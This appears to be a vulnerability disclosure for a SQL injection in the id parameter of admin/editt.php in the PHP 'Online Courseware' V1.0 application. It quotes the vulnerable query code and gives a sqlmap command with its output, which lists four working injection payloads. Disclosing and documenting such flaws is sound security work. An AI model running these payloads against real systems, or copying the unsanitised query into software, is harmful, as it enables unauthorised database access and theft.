#### BUG_AUTHOR:LIU WEIYU
## Online Courseware - SQL Injection on (admin/editt.php id parameter) 
### Vendor Homepage:
https://www.sourcecodester.com/php/4818/online-courseware-using-phpmysql.html 
### Version:V1.0
### Tested on: PHP, Apache, MySQL
### Affected Page:
admin/editt.php 

On this page, id parameter is vulnerable to SQL Injection Attack 
### Source code(pcci/admin/editt.php):
```
$id=$_GET['id'];
$results = mysqli_query($conn,"SELECT * FROM teacher WHERE id='$id'");
Proof of vulnerability(Verify using the sqlmap tool after logining ):
```
#### -> sqlmap -u http://localhost/onlinecourseware/pcci/admin/editt.php?id=1 --batch
### Output:
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5266=5266 AND 'ZpnB'='ZpnB

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' OR (SELECT 2022 FROM(SELECT COUNT(*),CONCAT(0x717a7a7a71,(SELECT (ELT(2022=2022,1))),0x716a707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'tlWY'='tlWY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9399 FROM (SELECT(SLEEP(5)))rRvj) AND 'sVGJ'='sVGJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 16 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x717a7a7a71,0x63576642676b7858487057555879434b5942445667556c4f637446536a6672626d78684b70577554,0x716a707871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```
